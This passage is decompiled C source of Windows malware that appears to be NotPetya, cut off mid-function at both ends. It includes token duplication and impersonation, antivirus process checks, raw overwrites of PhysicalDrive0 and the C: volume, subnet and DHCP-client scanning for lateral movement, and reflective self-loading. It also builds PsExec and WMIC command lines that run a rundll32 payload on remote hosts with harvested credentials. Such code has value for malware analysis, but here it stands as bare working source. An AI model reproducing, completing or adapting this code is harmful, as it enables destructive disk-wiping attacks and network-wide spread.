							v4 = &v9 + (v3 & 3);
							v5 = (*v4 ^ LOBYTE(pe.szExeFile[v2++])) - 1;
							++v3;
							*v4 = v5;
						} while (v2 < v1);
					}
					++v0;
				} while (v0 < 3);
				if (v9 == 0x2E214B44)
				{
					v10 &= 0xFFFFFFF7;
				}
				else if (v9 == 0x6403527E || v9 == 0x651B3005)
				{
					v10 &= 0xFFFFFFFB;
				}
			} while (Process32NextW(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
	}
	return v10;
}

//----- (681F875A) --------------------------------------------------------
unsigned int __stdcall EnumerateProcessesAndTokens(int a1)
{
	HANDLE v1; // eax
	HANDLE v2; // eax
	int v3; // edi
	int v4; // eax
	int v5; // eax
	int v6; // ecx
	unsigned int v8; // [esp+10h] [ebp-1290h]
	HANDLE TokenHandle; // [esp+14h] [ebp-128Ch]
	unsigned int v10; // [esp+18h] [ebp-1288h]
	HANDLE phNewToken; // [esp+1Ch] [ebp-1284h]
	int TokenInformation; // [esp+20h] [ebp-1280h]
	HANDLE hSnapshot; // [esp+24h] [ebp-127Ch]
	DWORD ReturnLength; // [esp+28h] [ebp-1278h]
	HANDLE hObject; // [esp+2Ch] [ebp-1274h]
	int v16; // [esp+30h] [ebp-1270h]
	int v17; // [esp+34h] [ebp-126Ch]
	char v18; // [esp+38h] [ebp-1268h]
	int v19; // [esp+40h] [ebp-1260h]
	PROCESSENTRY32W pe; // [esp+70h] [ebp-1230h]
	int v21; // [esp+2A0h] [ebp-1000h]
	char Dst; // [esp+2A4h] [ebp-FFCh]

	v10 = 0;
	ReturnLength = 0;
	v21 = 0;
	memset(&Dst, 0, 0xFFCu);
	v8 = 0;
	v17 = GetversionInfo();
	v1 = CreateToolhelp32Snapshot(2u, 0);
	hSnapshot = v1;
	if (v1 != -1)
	{
		pe.dwSize = 556;
		if (Process32FirstW(v1, &pe))
		{
			v16 = a1 - &v21;
			do
			{
				TokenInformation = -1;
				TokenHandle = 0;
				phNewToken = 0;
				v2 = OpenProcess(0x450u, 0, pe.th32ProcessID);
				hObject = v2;
				if (v2)
				{
					if (OpenProcessToken(v2, 0x2000000u, &TokenHandle)
						&& GetTokenInformation(TokenHandle, TokenSessionId, &TokenInformation, 4u, &ReturnLength)
						&& (!v17 || TokenInformation))
					{
						if (DuplicateTokenEx(TokenHandle, 0x2000000u, 0, SecurityImpersonation, TokenImpersonation, &phNewToken))
						{
							memset(&v18, 0, 0x38u);
							if (GetTokenInformation(phNewToken, TokenStatistics, &v18, 0x38u, &ReturnLength))
							{
								v3 = v19;
								v4 = 0;
								if (v8 <= 0)
								{
								LABEL_14:
									if (SetTokenInformation(phNewToken, TokenSessionId, &TokenInformation, 4u))
									{
										v5 = 4 * v8;
										v6 = 4 * v8 + v16;
										++v10;
										++v8;
										*(&v21 + v6) = phNewToken;
										*(&v21 + v5) = v3;
									}
								}
								else
								{
									while (*(&v21 + v4) != v19)
									{
										if (++v4 >= v8)
											goto LABEL_14;
									}
								}
							}
						}
					}
					CloseHandle(TokenHandle);
					CloseHandle(hObject);
				}
			} while (v10 < 0x40 && Process32NextW(hSnapshot, &pe));
		}
		else
		{
			GetLastError();
		}
		CloseHandle(hSnapshot);
	}
	return v10;
}

//----- (681F8946) --------------------------------------------------------
signed int  CreateSomeFile_2(DWORD a1, const WCHAR *lpFileName, LPCVOID lpBuffer, DWORD NumberOfBytesWritten)
{
	signed int v4; // esi
	HANDLE v5; // edi

	v4 = 0;
	v5 = CreateFileW(lpFileName, 0x40000000u, 0, 0, (NumberOfBytesWritten != 0) + 1, 0, 0);
	if (v5 != -1)
	{
		if (WriteFile(v5, lpBuffer, a1, &NumberOfBytesWritten, 0) && NumberOfBytesWritten == a1)
			v4 = 1;
		CloseHandle(v5);
	}
	return v4;
}

//----- (681F8999) --------------------------------------------------------
signed int  GetDllHostData(__m64 mm0_0, __m64 a2, int a1)
{
	HRSRC v3; // eax
	int v4; // eax
	HANDLE v5; // eax
	WCHAR *v6; // eax
	UINT v7; // eax
	LPWSTR v8; // ST10_4
	HANDLE v9; // eax
	int v10; // ecx
	_BYTE *i; // eax
	void *v12; // ST10_4
	HANDLE v13; // eax
	signed int v15; // [esp+8h] [ebp-10h]
	DWORD dwErrCode; // [esp+Ch] [ebp-Ch]
	int v17; // [esp+10h] [ebp-8h]
	LPVOID lpMem; // [esp+14h] [ebp-4h]

	dwErrCode = 0;
	v15 = 0;
	lpMem = 0;
	v17 = 0;
	v3 = FindResourceW(Src, 3, 0xA);
	if (v3)
		v4 = LoadAndLock(&lpMem, mm0_0, a2, &v17, v3);
	else
		v4 = 0;
	if (!v4)
		goto LABEL_21;
	v5 = GetProcessHeap();
	v6 = HeapAlloc(v5, 8u, 0x208u);
	::lpMem = v6;
	if (a1)
	{
		v7 = GetWindowsDirectoryW(v6, 0x104u);
	}
	else
	{
		if (SHGetFolderPathW(0, 35, 0, 0, v6))
			goto LABEL_12;
		v7 = wcslen(::lpMem);
	}
	if (v7 && v7 + 12 < 0x104)
	{
		PathAppendW(::lpMem, L"dllhost.dat");
		goto LABEL_13;
	}
LABEL_12:
	v8 = ::lpMem;
	v9 = GetProcessHeap();
	HeapFree(v9, 0, v8);
	::lpMem = 0;
LABEL_13:
	if (::lpMem)
	{
		if (CreateSomeFile_2(v17, ::lpMem, lpMem, 0))
		{
		LABEL_17:
			v15 = 1;
			goto LABEL_18;
		}
		dwErrCode = GetLastError();
		if (dwErrCode == 80)
		{
			dwErrCode = 0;
			goto LABEL_17;
		}
	}
LABEL_18:
	v10 = v17;
	for (i = lpMem; v10; --v10)
		*i++ = 0;
	v12 = lpMem;
	v13 = GetProcessHeap();
	HeapFree(v13, 0, v12);
LABEL_21:
	SetLastError(dwErrCode);
	return v15;
}

//----- (681F8ACF) --------------------------------------------------------
signed int CreateSomeFile()
{
	HANDLE v0; // eax
	DWORD v1; // eax
	DWORD v2; // esi
	SIZE_T v3; // ST10_4
	HANDLE v4; // eax
	void *v5; // ebx
	HANDLE v6; // eax
	signed int v8; // [esp+4h] [ebp-Ch]
	HANDLE hFile; // [esp+8h] [ebp-8h]
	DWORD NumberOfBytesRead; // [esp+Ch] [ebp-4h]

	v8 = 0;
	v0 = CreateFileW(&pszPath, 0x80000000, 1u, 0, 3u, 0, 0);
	hFile = v0;
	if (v0 != -1)
	{
		v1 = GetFileSize(v0, 0);
		v2 = v1;
		if (v1)
		{
			v3 = v1;
			v4 = GetProcessHeap();
			v5 = HeapAlloc(v4, 0, v3);
			if (v5)
			{
				NumberOfBytesRead = 0;
				if (ReadFile(hFile, v5, v2, &NumberOfBytesRead, 0) || NumberOfBytesRead != v2)
				{
					dword_6820F0FC = v5;
					dword_6820F11C = v2;
					v8 = 1;
				}
				else
				{
					v6 = GetProcessHeap();
					HeapFree(v6, 0, v5);
				}
			}
		}
		CloseHandle(hFile);
	}
	return v8;
}

//----- (681F8B70) --------------------------------------------------------
signed int __stdcall FindFileByName(int a1)
{
	signed int v1; // edi
	LPWSTR v2; // eax
	int v3; // edx
	unsigned __int16 v4; // cx

	v1 = 0;
	if (a1)
	{
		v2 = PathFindFileNameW(&pszPath);
		if (v2)
		{
			if (wcslen(v2) < 0x104)
			{
				v3 = a1 - v2;
				do
				{
					v4 = *v2;
					*(v2 + v3) = *v2;
					++v2;
				} while (v4);
				v1 = 1;
			}
		}
	}
	return v1;
}

//----- (681F8BC6) --------------------------------------------------------
signed int CheckSecurityAuthorityAndTokens()
{
	HANDLE v0; // eax
	PSID *v1; // edi
	unsigned int v2; // ebx
	PSID *v3; // esi
	PUCHAR v4; // eax
	PDWORD v5; // eax
	DWORD v6; // eax
	signed int v8; // [esp+4h] [ebp-Ch]
	HANDLE TokenHandle; // [esp+8h] [ebp-8h]
	DWORD ReturnLength; // [esp+Ch] [ebp-4h]

	v8 = 0;
	TokenHandle = 0;
	v0 = GetCurrentThread();
	if (OpenThreadToken(v0, 0x20008u, 1, &TokenHandle))
	{
		ReturnLength = 0;
		if (!GetTokenInformation(TokenHandle, TokenGroups, 0, 0, &ReturnLength) && GetLastError() == 122)
		{
			v1 = GlobalAlloc(0x40u, ReturnLength);
			if (v1)
			{
				if (GetTokenInformation(TokenHandle, TokenGroups, v1, ReturnLength, &ReturnLength))
				{
					v2 = 0;
					if (*v1)
					{
						v3 = v1 + 1;
						do
						{
							if (v8)
								break;
							v4 = GetSidSubAuthorityCount(*v3);
							if (v4)
							{
								if (*v4 >= 4u)
								{
									v5 = GetSidSubAuthority(*v3, 4u);
									if (v5)
									{
										v6 = *v5;
										if (v6 == 512 || v6 == 519)
											v8 = 1;
									}
								}
							}
							++v2;
							v3 += 2;
						} while (v2 < *v1);
					}
				}
				else
				{
					GetLastError();
				}
				GlobalFree(v1);
			}
			else
			{
				GetLastError();
			}
		}
		CloseHandle(TokenHandle);
	}
	else
	{
		GetLastError();
	}
	return v8;
}

//----- (681F8CBF) --------------------------------------------------------
signed int EnumPhysDriv0()
{
	HANDLE v0; // ebx
	char OutBuffer; // [esp+10h] [ebp-20h]
	int v3; // [esp+24h] [ebp-Ch]
	LPCVOID lpBuffer; // [esp+28h] [ebp-8h]
	DWORD BytesReturned; // [esp+2Ch] [ebp-4h]

	v0 = CreateFileA("\\\\.\\PhysicalDrive0", 0x40000000u, 3u, 0, 3u, 0, 0);
	if (!v0)
		return 0;
	DeviceIoControl(v0, 0x70000u, 0, 0, &OutBuffer, 0x18u, &BytesReturned, 0);
	lpBuffer = LocalAlloc(0, 10 * v3);
	if (lpBuffer)
	{
		DeviceIoControl(v0, 0x90020u, 0, 0, 0, 0, &BytesReturned, 0);
		WriteFile(v0, lpBuffer, 10 * v3, &BytesReturned, 0);
		LocalFree(lpBuffer);
	}
	CloseHandle(v0);
	return 1;
}

//----- (681F8D5A) --------------------------------------------------------
int SetLockAtCDir()
{
	HANDLE v0; // edi
	HLOCAL v1; // ebx
	int result; // eax
	DWORD BytesReturned; // [esp+Ch] [ebp-1Ch]
	char OutBuffer; // [esp+10h] [ebp-18h]
	LONG lDistanceToMove; // [esp+24h] [ebp-4h]

	v0 = CreateFileA("\\\\.\\C:", 0x40000000u, 3u, 0, 3u, 0, 0);
	if (v0)
	{
		if (DeviceIoControl(v0, 0x70000u, 0, 0, &OutBuffer, 0x18u, &BytesReturned, 0))
		{
			v1 = LocalAlloc(0, 10 * lDistanceToMove);
			if (v1)
			{
				SetFilePointer(v0, lDistanceToMove, 0, 0);
				WriteFile(v0, v1, lDistanceToMove, &BytesReturned, 0);
				LocalFree(v1);
			}
		}
		CloseHandle(v0);
	}
	if (!(EnumeratedProcessesHandle & 8) || (result = RunCryptWriteMBR()) != 0)
		result = EnumPhysDriv0();
	return result;
}
// 6820F104: using guessed type int EnumeratedProcessesHandle;

//----- (681F8E04) --------------------------------------------------------
DWORD __stdcall Unk_ConvertIPAddress(LPVOID lpThreadParameter)
{
	struct _RTL_CRITICAL_SECTION **v1; // esi
	u_long v2; // ebx
	int v3; // eax
	u_long v4; // eax
	char *v5; // eax
	char *v6; // eax
	char *v7; // ebx
	HANDLE v8; // eax
	u_long v10; // [esp+Ch] [ebp-8h]
	u_long v11; // [esp+10h] [ebp-4h]

	v1 = lpThreadParameter;
	v2 = *lpThreadParameter;
	v11 = *lpThreadParameter;
	v10 = *(lpThreadParameter + 1);
	if (*lpThreadParameter < v10)
	{
		do
		{
			v3 = ntohl(v2);
			if (CheckIfDataWasSent(v3))
			{
				v4 = ntohl(v2);
				v5 = inet_ntoa(v4);
				v6 = ConvertHeapMToWBytes(v5);
				v7 = v6;
				if (v6)
				{
					sub_681F6FC7(v6, 0, v1[2]);
					v8 = GetProcessHeap();
					HeapFree(v8, 0, v7);
					v1 = lpThreadParameter;
				}
			}
			v2 = v11 + 1;
			v11 = v2;
		} while (v2 < v10);
	}
	LocalFree(v1);
	return 0;
}

//----- (681F8E7F) --------------------------------------------------------
DWORD __stdcall GetNetworkInterfaces(LPVOID lpThreadParameter)
{
	unsigned int v1; // ebx
	struct _IP_ADAPTER_INFO *v2; // edi
	char *v3; // eax
	HANDLE v4; // eax
	char *v5; // eax
	HANDLE v6; // eax
	_DWORD *v7; // esi
	unsigned __int32 v8; // eax
	int v9; // edx
	int v10; // ecx
	HANDLE v11; // eax
	unsigned int v13; // [esp+Ch] [ebp-3014h]
	unsigned int v14; // [esp+10h] [ebp-3010h]
	char *lpMem; // [esp+14h] [ebp-300Ch]
	char *lpMema; // [esp+14h] [ebp-300Ch]
	LPVOID lpMemb; // [esp+14h] [ebp-300Ch]
	ULONG SizePointer; // [esp+18h] [ebp-3008h]
	HLOCAL hMem; // [esp+1Ch] [ebp-3004h]
	HANDLE hObject; // [esp+20h] [ebp-3000h]
	char Dst; // [esp+24h] [ebp-2FFCh]
	int v22; // [esp+1020h] [ebp-2000h]
	int v23[2047]; // [esp+1024h] [ebp-1FFCh]

	v1 = 0;
	hObject = 0;
	memset(&Dst, 0, 0xFFCu);
	v22 = 0;
	memset(v23, 0, 0x1FFCu);
	SizePointer = 0;
	v13 = 0;
	v14 = 0;
	if (GetAdaptersInfo(0, &SizePointer) == 111)
	{
		v2 = LocalAlloc(0x40u, SizePointer);
		hMem = v2;
		if (v2)
		{
			if (!GetAdaptersInfo(v2, &SizePointer))
			{
				do
				{
					if (v13 >= 0x400)
						break;
					*(&v22 + 2 * v13) = inet_addr(v2->IpAddressList.IpAddress.String);
					v23[2 * v13] = inet_addr(v2->IpAddressList.IpMask.String);
					v3 = ConvertHeapMToWBytes(v2->IpAddressList.IpAddress.String);
					lpMem = v3;
					if (v3)
					{
						sub_681F6FC7(v3, 1, lpThreadParameter);
						v4 = GetProcessHeap();
						HeapFree(v4, 0, lpMem);
					}
					if (v2->DhcpEnabled)
					{
						v5 = ConvertHeapMToWBytes(v2->DhcpServer.IpAddress.String);
						lpMema = v5;
						if (v5)
						{
							sub_681F6FC7(v5, 0, lpThreadParameter);
							v6 = GetProcessHeap();
							HeapFree(v6, 0, lpMema);
						}
					}
					v2 = v2->Next;
					++v13;
				} while (v2);
				if (FreeNetApiBuffer())
					EnumerateHostNameAndIP_2(lpThreadParameter);
				if (v13 > 0)
				{
					do
					{
						v7 = LocalAlloc(0x40u, 0xCu);
						if (v7)
						{
							v8 = inet_addr("255.255.255.255");
							v9 = v23[2 * v14];
							v10 = v9 & *(&v22 + 2 * v14);
							if (v9 & *(&v22 + 2 * v14))
							{
								lpMemb = (v10 | v9 ^ v8);
								if (lpMemb)
								{
									*v7 = ntohl(v10);
									v7[1] = ntohl(lpMemb);
									v7[2] = lpThreadParameter;
									v11 = CreateThread(0, 0, Unk_ConvertIPAddress, v7, 0, 0);
									if (v11)
										*(&hObject + v14) = v11;
								}
							}
						}
						++v14;
					} while (v14 < v13);
				}
				if (v14 > 0)
				{
					do
						CloseHandle(*(&hObject + v1++));
					while (v1 < v14);
				}
			}
			LocalFree(hMem);
		}
	}
	return 0;
}
// 681F8E7F: using guessed type int var_1FFC[2047];

//----- (681F908A) --------------------------------------------------------
int __stdcall EnumerateHostNameAndIP_2(int a1)
{
	unsigned int v1; // ebx
	unsigned int v2; // esi
	DWORD v3; // eax
	LPDHCP_CLIENT_INFO v4; // esi
	int v5; // eax
	u_long v6; // eax
	char *v7; // eax
	char *v8; // eax
	char *v9; // ebx
	HANDLE v10; // eax
	WCHAR Buffer; // [esp+10h] [ebp-244h]
	DWORD ClientsTotal; // [esp+218h] [ebp-3Ch]
	DWORD v14; // [esp+21Ch] [ebp-38h]
	DWORD nSize; // [esp+220h] [ebp-34h]
	unsigned int v16; // [esp+224h] [ebp-30h]
	DHCP_RESUME_HANDLE ResumeHandle; // [esp+228h] [ebp-2Ch]
	DHCP_RESUME_HANDLE v18; // [esp+22Ch] [ebp-28h]
	DWORD ElementsTotal; // [esp+230h] [ebp-24h]
	DWORD ClientsRead; // [esp+234h] [ebp-20h]
	DWORD ElementsRead; // [esp+238h] [ebp-1Ch]
	unsigned int v22; // [esp+23Ch] [ebp-18h]
	unsigned int v23; // [esp+240h] [ebp-14h]
	LPDHCP_SUBNET_INFO SubnetInfo; // [esp+244h] [ebp-10h]
	LPDHCP_CLIENT_INFO_ARRAY ClientInfo; // [esp+248h] [ebp-Ch]
	LPDHCP_IP_ARRAY EnumInfo; // [esp+24Ch] [ebp-8h]

	v1 = 0;
	v2 = 0;
	ResumeHandle = 0;
	v18 = 0;
	EnumInfo = 0;
	SubnetInfo = 0;
	ClientInfo = 0;
	v22 = 0;
	v23 = 0;
	ElementsRead = 0;
	ElementsTotal = 0;
	ClientsRead = 0;
	ClientsTotal = 0;
	nSize = 260;
	GetComputerNameExW(ComputerNamePhysicalNetBIOS, &Buffer, &nSize);
	if (!DhcpEnumSubnets(&Buffer, &ResumeHandle, 0x400u, &EnumInfo, &ElementsRead, &ElementsTotal))
	{
		v14 = EnumInfo->NumElements;
		if (v14 > 0)
		{
			do
			{
				if (!DhcpGetSubnetInfo(0, EnumInfo->Elements[v1], &SubnetInfo)
					&& SubnetInfo->SubnetState == DhcpSubnetEnabled
					&& !DhcpEnumSubnetClients(0, EnumInfo->Elements[v1], &v18, 0x10000u, &ClientInfo, &ClientsRead, &ClientsTotal))
				{
					v3 = ClientInfo->NumElements;
					v16 = v3;
					if (v3 && v2 < v3)
					{
						do
						{
							v4 = ClientInfo->Clients[v2];
							if (v4)
							{
								v5 = ntohl(v4->ClientIpAddress);
								if (CheckIfDataWasSent(v5))
								{
									v6 = ntohl(v4->ClientIpAddress);
									v7 = inet_ntoa(v6);
									v8 = ConvertHeapMToWBytes(v7);
									v9 = v8;
									if (v8)
									{
										sub_681F6FC7(v8, 0, a1);
										v10 = GetProcessHeap();
										HeapFree(v10, 0, v9);
									}
								}
							}
							v2 = v23 + 1;
							v23 = v2;
						} while (v2 < v16);
					}
					DhcpRpcFreeMemory(ClientInfo);
				}
				v1 = v22 + 1;
				v22 = v1;
			} while (v1 < v14);
		}
		DhcpRpcFreeMemory(EnumInfo);
	}
	return 0;
}

//----- (681F91FA) --------------------------------------------------------
signed int __thiscall sub_681F91FA(int this, int a2) // remove? 
{
	int v2; // edx
	int v3; // edi
	__int16 *v4; // esi
	__int16 v5; // dx
	signed int i; // [esp+0h] [ebp-8h]
	unsigned int v8; // [esp+4h] [ebp-4h]

	v2 = *this;
	for (i = 1; *this; v2 = *this)
	{
		if (!i)
			break;
		v8 = 0;
		v3 = v2 + a2;
		v4 = (this + 8);
		if ((*(this + 4) - 8) & 0xFFFFFFFE)
		{
			do
			{
				v5 = *v4;
				if (*v4)
				{
					if ((v5 & 0xF000) == 12288)
						*((v5 & 0xFFF) + v3) += a2 - Src;
					else
						i = 0;
				}
				++v8;
				++v4;
			} while (v8 < (*(this + 4) - 8) >> 1);
		}
		this += *(this + 4);
	}
	return i;
}

//----- (681F9286) --------------------------------------------------------
int  CheckImageVProtect(int a1, LPVOID lpAddress)
{
	int v2; // eax
	int v3; // eax
	int *v4; // edi
	int v5; // eax
	DWORD v6; // ecx
	int v7; // eax
	DWORD flOldProtect; // [esp+4h] [ebp-Ch]
	int v10; // [esp+8h] [ebp-8h]
	int v11; // [esp+Ch] [ebp-4h]

	v11 = 0;
	if (VirtualProtect(lpAddress, *(a1 + 84), 2u, &flOldProtect))
	{
		v2 = *(a1 + 20);
		v10 = 0;
		v11 = 1;
		v3 = v2 + a1 + 24;
		if (*(a1 + 6) > 0u)
		{
			v4 = (v3 + 36);
			do
			{
				if (!v11)
					break;
				v5 = *v4;
				v6 = 2;
				if (*v4 & 0x20000000)
				{
					v6 = v5 < 0 ? 64 : 32;
				}
				else if (v5 < 0)
				{
					v6 = 4;
				}
				if (!VirtualProtect(lpAddress + *(v4 - 6), *(v4 - 7), v6, &flOldProtect))
					v11 = 0;
				v7 = *(a1 + 6);
				v4 += 10;
				++v10;
			} while (v10 < v7);
		}
	}
	return v11;
}

//----- (681F9322) --------------------------------------------------------
unsigned int __thiscall sub_681F9322(int this, unsigned int a2) // remove?
{
	_DWORD *v2; // edx
	int v3; // ecx
	unsigned int result; // eax
	int v5; // edi
	unsigned int v6; // esi

	v2 = (*(this + 20) + this + 24);
	v3 = *(this + 6);
	result = 0;
	v5 = 0;
	if (v3 > 0)
	{
		while (1)
		{
			v6 = v2[3];
			if (v6 <= a2 && v6 + v2[4] >= a2)
				break;
			v2 += 10;
			if (++v5 >= v3)
				return result;
		}
		result = a2 + v2[5] - v6;
	}
	return result;
}

//----- (681F9367) --------------------------------------------------------
BOOL LoadSomeLibraries()
{
	int v0; // eax
	char *v1; // eax
	_DWORD *v2; // ebx
	int v3; // edx
	signed int v4; // edi
	int v5; // esi
	DWORD v6; // eax
	DWORD v7; // edx
	bool v8; // zf
	FARPROC *v9; // esi
	int *i; // edi
	FARPROC v11; // eax
	int v12; // eax
	DWORD flOldProtect; // [esp+8h] [ebp-10h]
	char *v15; // [esp+Ch] [ebp-Ch]
	HMODULE hModule; // [esp+10h] [ebp-8h]
	BOOL v17; // [esp+14h] [ebp-4h]

	v0 = *(Src + 15);
	v17 = 0;
	v1 = Src + v0;
	v2 = (Src + *(v1 + 32));
	if (v2)
	{
		v3 = *(v1 + 10);
		hModule = 0;
		v4 = *(v1 + 3);
		v5 = &v1[v3 + 24];
		v15 = &v1[v3 + 24];
		if (v4 > 0)
		{
			v6 = *(v1 + 54);
			flOldProtect = v6;
			do
			{
				v7 = *(v5 + 12);
				if (v6 >= v7)
				{
					v6 = flOldProtect;
					if (flOldProtect < v7 + *(v5 + 8))
						break;
				}
				hModule = (hModule + 1);
				v5 += 40;
				v15 = v5;
			} while (hModule < v4);
		}
		if (VirtualProtect(Src + *(v5 + 12), *(v5 + 8), 4u, &flOldProtect))
		{
			v8 = *v2 == 0;
			v17 = 1;
			if (v8)
				goto LABEL_28;
			do
			{
				if (v17 != 1)
					break;
				hModule = LoadLibraryA(Src + v2[3]);
				if (hModule)
				{
					v9 = (Src + v2[4]);
					for (i = (Src + *v2); ; ++i)
					{
						v12 = *i;
						if (!*i || v17 != 1)
							break;
						if ((v12 & 0x7FFFFFFF) == v12)
							v11 = GetProcAddress(hModule, Src + (v12 & 0x7FFFFFFF) + 2);
						else
							v11 = GetProcAddress(hModule, (v12 & 0x7FFFFFFF));
						*v9 = v11;
						if (!v11)
							v17 = 0;
						++v9;
					}
					v5 = v15;
				}
				else
				{
					v17 = 0;
				}
				v2 += 5;
			} while (*v2);
			if (v17)
				LABEL_28:
			v17 = VirtualProtect(Src + *(v5 + 12), *(v5 + 8), flOldProtect, &flOldProtect);
		}
	}
	return v17;
}

//----- (681F94A5) --------------------------------------------------------
BOOL  CleanUp(__m64 a1, __m64 a2, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread)
{
	BOOL result; // eax
	HANDLE v7; // eax
	HANDLE v8; // eax
	void *v9; // eax
	HANDLE v10; // eax
	void *lpMem; // [esp+4h] [ebp-Ch]
	HANDLE hObject; // [esp+8h] [ebp-8h]
	HANDLE hObjecta; // [esp+8h] [ebp-8h]
	SIZE_T dwBytes; // [esp+Ch] [ebp-4h]

	result = FreeLibrary(Src);
	PrivCheckCompleted = result;
	if (result)
	{
		Src = dword_6820F13C;
		v7 = CreateFileW(&pszPath, 0x80000000, 1u, 0, 3u, 0, 0);
		hObject = v7;
		if (v7)
		{
			dwBytes = GetFileSize(v7, 0);
			CloseHandle(hObject);
			hObjecta = CreateFileW(&pszPath, 0x40000000u, 0, 0, 2u, 0, 0);
			if (hObjecta)
			{
				v8 = GetProcessHeap();
				v9 = HeapAlloc(v8, 8u, dwBytes);
				lpMem = v9;
				if (v9)
				{
					WriteFile(hObjecta, v9, dwBytes, &dwBytes, 0);
					v10 = GetProcessHeap();
					HeapFree(v10, 0, lpMem);
				}
				CloseHandle(hObjecta);
			}
		}
		dword_6820F10C = DeleteFileW(&pszPath);
		if (LoadSomeLibraries())
			perfc_1(a1, a2, a3, dwErrCode, Thread, hThread);
		ExitProcess(0);
	}
	return result;
}
// 6820F10C: using guessed type int dword_6820F10C;
// 6820F114: using guessed type int PrivCheckCompleted;
// 6820F13C: using guessed type int dword_6820F13C;

//----- (681F9590) --------------------------------------------------------
int __stdcall SetVirtualAttributes(int a1, int a2, int a3)
{
	HMODULE v3; // edi
	char *v4; // eax
	char *v5; // ebx
	int v6; // edi
	int v7; // esi
	int v8; // eax
	SIZE_T v9; // esi
	SIZE_T v10; // ecx
	_BYTE *i; // eax
	DWORD flOldProtect; // [esp+0h] [ebp-8h]
	SIZE_T dwSize; // [esp+4h] [ebp-4h]

	if (!PrivCheckCompleted)
	{
		if (dword_6820F0FC)
		{
			v3 = Src;
			dwSize = *(Src + *(Src + 15) + 80);
			v4 = VirtualAlloc(0, dwSize, 0x1000u, 4u);
			v5 = v4;
			if (v4)
			{
				dword_6820F13C = v4;
				memcpy(v4, v3, dwSize);
				v6 = dword_6820F0FC;
				v7 = dword_6820F0FC + *(dword_6820F0FC + 60);
				if (v7)
				{
					if (*(v7 + 160))
					{
						if (*(v7 + 164))
						{
							v8 = v6 + sub_681F9322(v7, *(v7 + 160));
							if (v8)
							{
								if (sub_681F91FA(v8, v5) && CheckImageVProtect(v7, v5))
									(&v5[CleanUp - Src])(a1, a2, a3, -1);
							}
						}
					}
				}
				v9 = dwSize;
				if (VirtualProtect(v5, dwSize, 4u, &flOldProtect))
				{
					v10 = v9;
					for (i = v5; v10; --v10)
						*i++ = 0;
					VirtualFree(v5, v9, 0x4000u);
				}
			}
		}
	}
	return 0;
}
// 6820F114: using guessed type int PrivCheckCompleted;
// 6820F13C: using guessed type int dword_6820F13C;

//----- (681F9683) --------------------------------------------------------
int __stdcall EnumerateHostNameAndIP(char *name)
{
	signed int v1; // esi
	struct hostent *v2; // eax

	v1 = 0;
	v2 = gethostbyname(name);
	if (v2)
	{
		wsprintfA(
			name,
			"%u.%u.%u.%u",
			**v2->h_addr_list,
			*(*v2->h_addr_list + 1),
			*(*v2->h_addr_list + 2),
			*(*v2->h_addr_list + 3));
		v1 = 1;
	}
	return v1;
}

//----- (681F96C7) --------------------------------------------------------
int  SetWideAddress(__m64 a1, __m64 a2, LPCWSTR lpWideCharStr, int a4, int a5)
{
	int v5; // esi
	int v6; // edi
	LPWSTR v7; // eax
	char *v8; // edx
	WCHAR v9; // cx
	unsigned __int16 v11[260]; // [esp+8h] [ebp-310h]
	CHAR MultiByteStr; // [esp+210h] [ebp-108h]
	int v13; // [esp+314h] [ebp-4h]

	v13 = 0;
	v5 = dword_6820F11C;
	v6 = dword_6820F0FC;
	if (EnumeratedProcessesHandle & 4)
	{
		v7 = PathFindFileNameW(&pszPath);
		if (v7)
		{
			v8 = (v11 - v7);
			do
			{
				v9 = *v7;
				*(v7 + v8) = *v7;
				++v7;
			} while (v9);
			WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, -1, &MultiByteStr, 260, 0, 0);
			if ((inet_addr(&MultiByteStr) != -1 || EnumerateHostNameAndIP(&MultiByteStr))
				&& !sub_681F668A(a1, a2, &MultiByteStr, v6, v5, a4, a5, v11, wcslen(v11)))
			{
				v13 = 1;
			}
		}
	}
	return v13;
}
// 6820F104: using guessed type int EnumeratedProcessesHandle;

//----- (681F97A5) --------------------------------------------------------
int  AcceptEulaAndLaunch(WCHAR *a1, WCHAR *a2, int a3)
{
	WCHAR *v3; // esi
	unsigned int v4; // edi
	LPWSTR v5; // eax
	int v6; // edx
	WCHAR v7; // cx
	int v8; // eax
	int v9; // edi
	unsigned int v10; // ecx
	signed int v11; // eax
	char Src; // [esp+8h] [ebp-4210h]
	char v14; // [esp+4008h] [ebp-210h]
	int v15; // [esp+4210h] [ebp-8h]
	DWORD dwErrCode; // [esp+4214h] [ebp-4h]

	v3 = a1;
	*a2 = 0;
	*a1 = 0;
	v4 = 0;
	v15 = 0;
	FindFileByName(&v14);
	v5 = lpMem;
	dwErrCode = 0;
	if (lpMem)
	{
		v4 = wcslen(lpMem);
		if (v4 > 0x104)
		{
			dwErrCode = 122;
		}
		else
		{
			v6 = v3 - lpMem;
			do
			{
				v7 = *v5;
				*(v5 + v6) = *v5;
				++v5;
			} while (v7);
		}
	}
	else
	{
		dwErrCode = 3;
	}
	SetLastError(dwErrCode);
	if (v4 && PathFileExistsW(v3))
	{
		v8 = wsprintfW(a2, L"%s \\\\%s -accepteula -s ", v3, a3);
		v9 = wsprintfW(&a2[v8], L"-d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\%s\",#1 ", &v14) + v8;
		v10 = sub_681F6BB0(&Src) + 1;
		v11 = 0x1FFF;
		if (v10 <= 0x1FFF)
			v11 = v10;
		memcpy(&a2[v9], &Src, 2 * v11);
		v15 = 1;
	}
	else
	{
		*a2 = 0;
		*v3 = 0;
	}
	return v15;
}

//----- (681F98AB) --------------------------------------------------------
signed int  InitRemoteLaunch(WCHAR *a1, WCHAR *a2, int a3, int a4, int a5)
{
	WCHAR *v5; // edi
	int v6; // ebx
	int v7; // eax
	int v8; // edi
	char *v9; // eax
	int v10; // ecx
	char v12; // [esp+8h] [ebp-4208h]
	char v13; // [esp+4008h] [ebp-208h]

	v5 = a1;
	*a2 = 0;
	*a1 = 0;
	v6 = 0;
	FindFileByName(&v13);
	if (!GetSystemDirectoryW(v5, 0x104u))
	{
		GetLastError();
		goto LABEL_10;
	}
	PathAppendW(v5, L"wbem\\wmic.exe");
	if (!PathFileExistsW(v5))
	{
	LABEL_10:
		*a2 = 0;
		*v5 = 0;
		return v6;
	}
	v7 = wsprintfW(a2, L"%s /node:\"%ws\" /user:\"%ws\" /password:\"%ws\" ", v5, a3, a4, a5);
	v8 = wsprintfW(
		&a2[v7],
		L"process call create \"C:\\Windows\\System32\\rundll32.exe \\\"C:\\Windows\\%s\\\" #1 ",
		&v13)
		+ v7;
